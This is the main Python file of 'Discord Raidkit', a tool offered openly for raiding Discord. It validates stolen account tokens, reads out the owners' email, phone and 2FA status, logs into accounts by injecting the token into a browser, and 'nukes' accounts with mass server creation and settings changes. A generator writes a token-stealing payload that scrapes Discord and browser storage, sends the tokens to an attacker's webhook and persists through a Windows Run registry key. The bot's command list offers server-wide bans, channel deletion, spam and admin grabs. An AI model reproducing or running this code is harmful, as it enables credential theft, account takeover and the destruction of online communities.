"""
Discord Raidkit v2.2.1 by the-cult-of-integral
"The trojan horse of discord raiding"
Last updated: 16/06/2022
"""

import json
import os
import platform
import random
import re
import webbrowser
from datetime import datetime

import discord
import requests
from bs4 import BeautifulSoup
from cogs.anubis.ahelp import AHelp
from cogs.anubis.moderation import Moderation
from cogs.anubis.raid_prevention import Raid_Prevention
from cogs.anubis.surfing import Surfing
from cogs.qetesh.images import Images
from cogs.qetesh.qhelp import QHelp
from cogs.shared.status import Status
from cogs.shared.tools import Tools
from discord.ext import commands
from selenium import webdriver
from selenium.common.exceptions import WebDriverException

from colorama import Fore, Back, Style, init; init()

VERSION = "v2.2.1"
README = "https://github.com/the-cult-of-integral/discord-raidkit/blob/master/README.md"
WIKI = "https://github.com/the-cult-of-integral/discord-raidkit/wiki"
ISSUES = "https://github.com/the-cult-of-integral/discord-raidkit/issues"
LICENSE = "https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE"
OSIRIS_BROWSER = "https://drive.google.com/file/d/1tx4QnZdCEDfT9MLh3SXIVlqcm_SrQ3P8/view"
CONFIG_PATH = "config_data.json"

guild_IDs = []
friend_IDs = []
channel_IDs = []


class DR_Client(commands.Bot):
    """A simple class to handle Anubis and Qetesh instances
    """
    def __init__(self, name, intents, config, code) -> None:
        self.prefix = config["bot_prefix"]
        self.name = name
        self.config = config
        self.code = code

        commands.Bot.__init__(
            self, 
            command_prefix=config["bot_prefix"],
            intents=intents,
            self_bot=False
        )

        self.remove_command("help")
        self.status = f"{self.prefix}help"
        return
    
    async def on_ready(self) -> None:
        clear()
        show_dr_client_screen(self.name, self.prefix, self.code)
        return
    
    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CommandNotFound):
            embed = discord.Embed(
                title="Error",
                description="**Command does not exist.**",
                color=discord.Colour.red())
            await ctx.send(embed=embed)
        elif isinstance(error, commands.MissingPermissions):
            embed = discord.Embed(
                title="Error",
                description="**Permission denied.**",
                color=discord.Colour.red())
            await ctx.send(embed=embed)
        elif isinstance(error, commands.NotOwner):
            embed = discord.Embed(
                title="Error",
                description="**You must be the owner of the bot to use this command.**",
                color=discord.Colour.red())
            await ctx.send(embed=embed)
        elif isinstance(error, commands.NSFWChannelRequired):
            embed = discord.Embed(
                title="Error",
                description="**This command can only be used in NSFW channels.**",
                color=discord.Colour.red())
            await ctx.send(embed=embed)
        elif isinstance(error, commands.CheckFailure):
            embed = discord.Embed(
                title="Error",
                description="**Access denied.**",
                color=discord.Colour.red())
            await ctx.send(embed=embed)
        else:
            print(error)


class Osiris:
    """A simple class to handle Osiris instances
    """

    def __init__(self, auth_token) -> None:
        self.auth_token = auth_token
        return
    
    def check_auth_token(self) -> tuple | bool:
        """Checks whether an auth token is valid or invalid

        Returns:
            tuple | bool: if valid, return a tuple of (True, Response); else, return False
        """
        headers = {"Authorization": self.auth_token, "Content-Type": "application/json"}
        r = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
        if r.status_code == 200:
            return (True, r)
        else:
            return False

    def get_account_info(self) -> str:
        """ Gets a discord accounts user ID, username, email and phone number (if available)
        \nAlso informs you of whether the discord accounts has 2FA enabled or not
        """
        if r := self.check_auth_token():
            userName = f"{r[1].json()['username']}#{r[1].json()['discriminator']}"
            userID = r[1].json()["id"]
            phone = r[1].json()["phone"]
            email = r[1].json()["email"]
            mfa = r[1].json()["mfa_enabled"]
            return f"""
{Fore.RESET}[{Fore.GREEN}User ID{Fore.RESET}]\t\t{userID}
[{Fore.GREEN}User Name{Fore.RESET}]\t\t{userName}
[{Fore.GREEN}2 Factor{Fore.RESET}]\t\t{mfa}
[{Fore.GREEN}Email{Fore.RESET}]\t\t\t{email}
[{Fore.GREEN}Phone number{Fore.RESET}]\t\t{phone if phone else ""}
[{Fore.GREEN}Token{Fore.RESET}]\t\t\t{self.auth_token}
"""
        else:
            return f"{Fore.RED}Invalid Auth Token{Fore.RESET}"
    
    def nuke_account(self) -> str:
        """Nuke a discord account via a token.
        """
        global guild_IDs

        def nuke_requests(headers) -> None:
            headers = headers

            for i in range(200):
                try:
                    payload = {
                        "name": "Hacked by the-cult-of-integral's Discord Raidkit!",
                        "region": "europe",
                        "icon": None,
                        "channels": None
                    }
                    requests.post(
                        "https://discord.com/api/v6/guilds",
                        headers=headers,
                        json=payload
                    )
                    print(f"{Fore.BLUE}Created payload server {i+1}/200")
                except:
                    pass

            settings = {
                "locale": "ja",
                "show_current_game": False,
                "default_guilds_restricted": True,
                "inline_attatchment_media": False,
                "inline_embed_media": False,
                "gif_auto_play": False,
                "render_embeds": False,
                "render_reactions": False,
                "animate_emoji": False,
                "enable_tts_command": False,
                "message_display_compact": True,
                "convert_emoticons": False,
                "explicit_content_filter": 0,
                "disable_games_tab": True,
                "theme": "light",
                "detect_platform_accounts": False,
                "stream_notifications_enabled": False,
                "animate_stickers": False,
                "view_nsfw_guilds": True,
            }

            requests.patch(
                "https://discord.com/api/v8/users/@me/settings",
                headers=headers,
                json=settings
            )
            print(f"{Fore.LIGHTMAGENTA_EX}Patched new settings for https://discord.com/api/v8/users/@me/settings\n")
            return

        try:
            if self.check_auth_token():

                # Attempt to IDs of guilds from settings response (used to make account leave every guild).

                headers = {
                    "Authorization": self.auth_token,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                }

                url = "https://discord.com/api/v8/users/@me/settings"
                r = requests.get(url, headers=headers)
                guild_IDs = r.json()['guild_positions']
                print(f"{Fore.GREEN}Nuking Started. . .")
                nuke_requests(headers)
                return f"{Fore.GREEN}Nuked Account Successfully{Fore.RESET}"
            else:
                return f"{Fore.RED}Invalid Auth Token{Fore.RESET}"
        except BaseException as e:
            return f"{Fore.RED}{e}{Fore.RESET}"

    def login(self) -> str:
        """Login to a discord account via a selenium script
        """
        try:
            if self.check_auth_token():
                webdriver.ChromeOptions.binary_location = r"browser\chrome.exe"
                opts = webdriver.ChromeOptions()
                opts.add_experimental_option("detach", True)
                Fore.BLUE
                driver = webdriver.Chrome(r"browser\chromedriver.exe", options=opts)
                script = """
                            function login(token) {
                            setInterval(() => {
                            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                            }, 50);
                            setTimeout(() => {
                            location.reload();
                            }, 2500);
                            }
                            """
                driver.get("https://discord.com/login")
                driver.execute_script(script + f'\nlogin("{self.auth_token}")')
                return f"{Fore.GREEN}Logged into account successfully!"
            else:
                return f"{Fore.RED}Invalid Auth Token{Fore.RESET}"
        except WebDriverException:
            return f"{Fore.RED}Osiris' browser folder was not found.{Fore.RESET}"
        except BaseException as e:
            return f"{Fore.RED}{e}{Fore.RESET}"
    
    def generate_grabber(self) -> str:
        """Generate a token grabber that copies itself to the Users folder and
        Windows start up registry key
        """
        try:
            webhook = input(f"{Fore.LIGHTBLUE_EX}Please enter a discord webhook: {Fore.RESET}")
            folder = input(f"{Fore.LIGHTBLUE_EX}Please enter a folder name (this folder will be created on the target's computer, containing another payload): {Fore.RESET}")
            rpayload = input(f"{Fore.LIGHTBLUE_EX}Please enter the regular payload name (this is the payload the target will knowingly run): {Fore.RESET}")
            hpayload = input(f"{Fore.LIGHTBLUE_EX}Please enter the hidden payload name (this is the payload the target will unknowingly run if registry key is enabled): {Fore.RESET}")
            do_reg_keg = input(f"{Fore.LIGHTBLUE_EX}Enter 1 to enable registry keys (will let the payload run every time the target logs into Windows): {Fore.RESET}")
            
            if do_reg_keg == "1":
                do_reg_keg = True
            else:
                do_reg_keg = False
            
            try:
                os.mkdir(folder)
                os.rmdir(folder)
                open(rpayload + ".txt", "w").close()
                os.remove(rpayload + ".txt")
                open(hpayload + ".txt", "w").close()
                os.remove(hpayload + ".txt")
            except:
                return f"{Fore.RED}Some options entered had invalid Windows names. . .{Fore.RESET}"

            code = get_generate_code(webhook, folder, hpayload, do_reg_keg)
            write_payload(code, rpayload)
            return f"{Fore.LIGHTGREEN_EX}Succesfully generated payload!"
        except BaseException as e:
            return f"{Fore.RED}{e}{Fore.RESET}"


async def run_dr_client(name, config) -> None:
    """Runs either Anubis or Qetesh

    Args:
        name (str): "Anubis" or "Qetesh"

    Returns:
        str: after client has ended, returns run status (success or fail w/ error)
    """
    runtime_code = random.randint(1000,9999)
    write_config("runtime_code", runtime_code)
    intents = discord.Intents.default()
    intents.members = True
    if not config["bot_prefix"]:
        if name == "Anubis":
            prefix = "a!"
        elif name == "Qetesh":
            prefix = "q!"
    else:
        prefix = config["bot_prefix"]

    client = DR_Client(name, intents, config, runtime_code)

    client.add_cog(Status(client))
    client.add_cog(Tools(client))
    if name == "Anubis":
        client.add_cog(Moderation(client))
        client.add_cog(Raid_Prevention(client))
        client.add_cog(Surfing(client))
        client.add_cog(AHelp(client))
    elif name == "Qetesh":
        client.add_cog(Images(client))
        client.add_cog(QHelp(client))

    try:
        await client.start(config["bot_token"])
        return f"{name} finished successfully!"
    except discord.errors.LoginFailure as e:
        await client.close()
        return f"{name} failed: invalid bot token"
    except BaseException as e:
        await client.close()
        return f"{name} failed: {e}"


def run_osiris(auth_token) -> None:
    """Create an instance of Osiris with a given auth_token

    Args:
        auth_token (str): the auth token of the account to target
    """
    osiris = Osiris(auth_token)
    while True:
        clear()
        show_osiris_options()
        choice = input()

        if choice == "1":
            clear()
            print(osiris.get_account_info())
            pause()
        
        elif choice == "2":
            clear()
            print(osiris.nuke_account())
            pause()
        
        elif choice == "3":
            clear()
            print(osiris.login())
            pause()
        
        elif choice == "4":
            clear()
            print(osiris.generate_grabber())
            pause()

        elif choice == "5":
            clear()
            print(f"{Fore.LIGHTGREEN_EX}Opening browser to download link. . .")
            webbrowser.open(OSIRIS_BROWSER)
            print(f"{Fore.LIGHTRED_EX}After downloading the browser folder, \
place the folder into the Discord Raidkit folder. Do not change anything.")
            pause()

        elif choice == "6":
            break
    
    return


def init_config() -> dict:
    """Initialize Discord Raidkit configuration JSON.

    Returns:
        dict: Discord Raidkit configuartion JSON as a dictionary.
    """
    if not os.path.isfile(CONFIG_PATH):
        data = {"bot_token": "", "bot_prefix": "", "auth_token": "", "runtime_code": ""}
        with open(CONFIG_PATH, "w") as f:
            json.dump(data, f, indent=4)
        return data
    else:
        with open(CONFIG_PATH, "r") as f:
            data = json.load(f)
        return data


def write_config(key, value) -> None:
    """Write to Discord Raidkit configuration JSON.

    Args:
        key (str): the key to write to.
        value (str): the value to be written.
    """
    config = init_config()
    config[key] = value
    with open(CONFIG_PATH, "w") as f:
        json.dump(config, f, indent=4)
    return


def clear() -> None:
    """Clears the terminal
    """
    if platform.system() == "Windows":
        os.system("cls")
    elif platform.system() in ["Linux, Darwin"]:
        os.system("clear")
    return


def show_config() -> None:
    """Prints the current Discord Raidkit config to the terminal
    """
    config = init_config()
    for key, val in config.items():
        print(f"{Fore.LIGHTBLUE_EX}{key}: {Fore.LIGHTGREEN_EX}{val}")
    print("")
    return


def show_dr_options() -> None:
    """Prints the start menu for Discord Raidkit
    """
    print(f"""{get_title("DR")}
{Fore.YELLOW}Options:

{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}1{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}View Current Config
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}2{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}Set Bot Token
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}3{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}Set Bot Prefix
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}4{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}Set Auth Token
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}5{Fore.LIGHTWHITE_EX}]\t{Fore.BLUE}Run Anubis
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}6{Fore.LIGHTWHITE_EX}]\t{Fore.RED}Run Qetesh
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}7{Fore.LIGHTWHITE_EX}]\t{Fore.GREEN}Run Osiris
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}8{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTYELLOW_EX}View Discord Raidkit README.md
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}9{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTYELLOW_EX}View Discord Raidkit Wiki
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}10{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTYELLOW_EX}View Discord Raidkit Issue Page
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}11{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTYELLOW_EX}View Discord Raidkit License
{Fore.LIGHTWHITE_EX}[{Fore.YELLOW}12{Fore.LIGHTWHITE_EX}]\t{Fore.RED}Exit

{Fore.YELLOW}>>> {Fore.RESET}""", end="")
    return


def get_title(tool) -> str:
    """Returns the ASCII art of either Anubis, Qetesh, Osiris, or the DR itself

    Args:
        tool (str): either "Anubis", "Qetesh", "Osiris", or "DR"

    Returns:
        str: the ASCII art of Anubis, Qetesh, Osiris, or the DR itself
    """
    if tool == "Anubis":
        return Fore.BLUE + f"""
                                     ███████╗███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
                                     ██╔══██║████╗  ██║██║   ██║██╔══██╗██║██╔════╝
                                     ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
                                     ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
                                     ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
                                     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝

""".replace("█", f"{Fore.WHITE}█{Fore.BLUE}")
    
    elif tool == "Qetesh":
        return Fore.RED + f"""
                                      ██████╗ ███████╗████████╗███████╗███████╗██╗  ██╗
                                     ██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
                                     ██║   ██║█████╗     ██║   █████╗  ███████╗███████║
                                     ██║▄▄ ██║██╔══╝     ██║   ██╔══╝  ╚════██║██╔══██║
                                     ╚██████╔╝███████╗   ██║   ███████╗███████║██║  ██║
                                      ╚══▀▀═╝ ╚══════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝

""".replace("█", f"{Fore.WHITE}█{Fore.RED}").replace("▀", f"{Fore.WHITE}▀{Fore.RED}").replace("▄", f"{Fore.WHITE}▄{Fore.RED}")

    elif tool == "Osiris":
        return Fore.GREEN + f""" 
                                           ██████╗ ███████╗██╗██████╗ ██╗███████╗
                                          ██╔═══██╗██╔════╝██║██╔══██╗██║██╔════╝
                                          ██║   ██║███████╗██║██████╔╝██║███████╗
                                          ██║   ██║╚════██║██║██╔══██╗██║╚════██║
                                          ╚██████╔╝███████║██║██║  ██║██║███████║
                                           ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                       
""".replace("█", f"{Fore.WHITE}█{Fore.GREEN}").replace("▀", f"{Fore.WHITE}▀{Fore.GREEN}").replace("▄", f"{Fore.WHITE}▄{Fore.GREEN}")
    
    elif tool == "DR":
        return Fore.LIGHTYELLOW_EX + f"""
                                    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
                                    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
                                    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
                                    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
                                    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
                                    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                        
                                      ██████╗  █████╗ ██╗██████╗ ██╗  ██╗██╗████████╗     
                                      ██╔══██╗██╔══██╗██║██╔══██╗██║ ██╔╝██║╚══██╔══╝     
                                      ██████╔╝███████║██║██║  ██║█████╔╝ ██║   ██║        
                                      ██╔══██╗██╔══██║██║██║  ██║██╔═██╗ ██║   ██║        
                                      ██║  ██║██║  ██║██║██████╔╝██║  ██╗██║   ██║        
                                      ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝ 
""".replace("█", f"{Fore.WHITE}█{Fore.LIGHTYELLOW_EX}").replace("▀", f"{Fore.WHITE}▀{Fore.LIGHTYELLOW_EX}").replace("▄", f"{Fore.WHITE}▄{Fore.LIGHTYELLOW_EX}")


def show_dr_client_screen(tool, prefix, code) -> None:
    """Prints either the Anubis or Qetesh main screen

    Args:
        tool (str): either "Anubis" or "Qetesh"
        prefix (str): the prefix that the client is using
        code (str): the runtime code that the client is using
    """
    print(f"""{get_title(tool)}\
{Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:
{Back.RESET}{Style.DIM}{Fore.RED}{prefix}leave {code} <server>: Makes the bot leave a server.
{Style.BRIGHT}{Fore.LIGHTRED_EX}{prefix}mass_leave {code}: Makes the bot leave every server.
{Style.DIM}{Fore.YELLOW}{prefix}nick_all {code} <nickname>: Change the nickname of all members on a server.
{Style.NORMAL}{Fore.GREEN}{prefix}msg_all {code} <message>: Message all of the members on a server with a custom message.
{Fore.BLUE}{prefix}spam {code} <message>: Repeatedly spam all text channels on a server with a custom message.
{Style.DIM}{Fore.MAGENTA}{prefix}cpurge {code}: Delete all channels on a server.
{Style.DIM}{Fore.MAGENTA}{prefix}cflood {code} <num_of_channels> <channel_name>: Flood a server with <num_of_channels> channels named <channel_name>.
{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{prefix}admin {code} <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
{Style.DIM}{Fore.RED}{prefix}nuke {code}: Ban all members, then delete all roles, then delete all channels, then delete all emojis on a server.
{Style.BRIGHT}{Fore.LIGHTRED_EX}{prefix}mass_nuke {code}: Nuke every server the bot is currently in.
{Style.DIM}{Fore.YELLOW}{prefix}raid {code} <role_name> <nickname> <num_of_channels> <channel_name> <message>:
Delete all channels, then delete all roles, then give everyone a new role, then nickname everyone a new nickname,
then create x number of channels, then message everyone with a message, then spam all channels with a message.

{Style.BRIGHT}{Fore.LIGHTWHITE_EX}To exit {tool}, do {Fore.LIGHTBLUE_EX}{prefix}shutdown {code}

{Style.DIM}{Fore.GREEN}Additional notes:
{Style.BRIGHT}{Back.RESET}{Fore.WHITE}Before running the nuke commands, make sure the role created by the bot upon its invite is above the roles of the
members you wish to ban (i.e. move the role as high as possible).

{Fore.LIGHTRED_EX}{tool} created by the-cult-of-integral (view for full guide): {Fore.WHITE}https://www.github.com/the-cult-of-integral/discord-raidkit{Style.DIM}{Fore.RED}

{Fore.LIGHTGREEN_EX}<<< OUTPUT >>>
{Fore.RESET}""")
    return


def show_osiris_options() -> None:
    """Prints the Osiris options
    """
    print(f"""{get_title("Osiris")}

{Fore.GREEN}Options:

{Fore.LIGHTWHITE_EX}[{Fore.BLUE}1{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}View account information
{Fore.LIGHTWHITE_EX}[{Fore.BLUE}2{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}Nuke account
{Fore.LIGHTWHITE_EX}[{Fore.BLUE}3{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}Log into account
{Fore.LIGHTWHITE_EX}[{Fore.BLUE}4{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}Generate token grabber payload
{Fore.LIGHTWHITE_EX}[{Fore.BLUE}5{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}Download browser folder
{Fore.LIGHTWHITE_EX}[{Fore.BLUE}6{Fore.LIGHTWHITE_EX}]\t{Fore.LIGHTBLUE_EX}Exit Osiris

{Fore.GREEN}>>> {Fore.RESET}""", end="")
    return


def get_new_code() -> str:
    """Returns a new command code

    Returns:
        str: a random number x in Z : {1000 <= x <= 9999}, as a string
    """
    return f"{random.randint(1000,9999)}"


def get_config(key) -> str:
    """Ask the user for a new value for key and return the value they enter
    \nThis is done in dr_c_utils to allow for colorama

    Returns:
        str: the new value the user enters for key
    """
    print(f"{Fore.LIGHTBLUE_EX}Enter a new {key}: {Fore.RESET}", end="")
    value = input()
    return value


def pause() -> None:
    """Simulate a command line pause
    """
    print(f"{Fore.YELLOW}Enter anything to continue: {Fore.RESET}", end="")
    input()
    return


def view_dr_github(page) -> None:
    """Opens a webbrowser to a specified Discord Raidkit GitHub page

    Args:
        page (str): "README", "Wiki", "Issues", or "License"
    """
    if page == "README":
        webbrowser.open(README)
    elif page == "Wiki":
        webbrowser.open(WIKI)
    elif page == "Issues":
        webbrowser.open(ISSUES)
    elif page == "License":
        webbrowser.open(LICENSE)
    return


def s_now() -> str:
    """Returns a string of the time when ran

    Returns:
        str: datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    """
    return datetime.now().strftime("%d-%m-%Y %H:%M:%S")


def check_update() -> None:
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    }
    url = f"https://github.com/the-cult-of-integral/discord-raidkit/releases/latest"
    clear()
    print(f"{Fore.BLUE}Checking for updates. . .")
    r = requests.get(url, headers=headers)
    clear()
    soup = str(BeautifulSoup(r.text, "html.parser"))
    s1 = re.search("<title>", soup)
    s2 = re.search("·", soup)
    result = soup[s1.end():s2.start()]
    if VERSION not in result:
        s1 = re.search('originating_url":"', soup)
        s2 = re.search('","user_id":null', soup)
        update_link = soup[s1.end():s2.start()]
        print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + f"""



                  ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                  ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                  ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
                  ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                  ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                  ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝


                {Fore.LIGHTRED_EX}There has been a brand new update to the discord raidkit. You can find the update here:

                      {Fore.LIGHTBLUE_EX}{update_link}

""".replace("█", f"{Fore.YELLOW}█{Fore.LIGHTGREEN_EX}"), end=f"\n\n{' '*45}")
        return


def get_generate_code(webhook, folder, hpayload, do_reg_key) -> str:
    """Get code to generate token grabber payload.

    Returns:
        str: code to generate token grabber payload.
    
    Credits:
    - wodxgod: created logic to grab discord tokens
    - Microsoft: lets me write to registry keys without administrator
    """

    code = r'''import os
import json
import os
import re
import shutil
import winreg
from urllib.request import Request, urlopen

PAYLOAD_PATH = os.path.realpath(__file__)
WEBHOOK_URL = "''' + webhook + r'''"


def set_autostart_registry(app_name, key_data=None, autostart=True) -> bool:
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r"Software\Microsoft\Windows\CurrentVersion\Run",
        reserved=0,
        access=winreg.KEY_ALL_ACCESS
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True


def find_tokens(path) -> list:
    path += "\\Local Storage\\leveldb"
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
    
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    
    return tokens


def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = "@everyone"

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
    
        message += f"\n**{platform}**\n"

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"
        
        message += "\n"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }

    payload = json.dumps({"content": message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == "__main__":
    path = fr"C:\Users\{os.getenv('username')}''' + f'''\{folder}''' + r'''"
    if not os.path.isdir(path):
        os.mkdir(path)
    file = "''' + hpayload + r'''.pyw"
    try:
        shutil.copy(__file__, f"{path}\{file}")
    except shutil.SameFileError:
        pass
    '''
    if do_reg_key: code += r'''set_autostart_registry("Osiris", f"{path}\{file}")
    '''
    code += r'''main()
'''
    return code


def write_payload(payload, rpayload) -> None:
    """Writes the token grabber payload file
    """
    if not os.path.isdir("payloads"):
        os.mkdir("payloads")
    
    with open(f"payloads/{rpayload}.pyw", "w") as f:
        f.write(payload)
    
    return

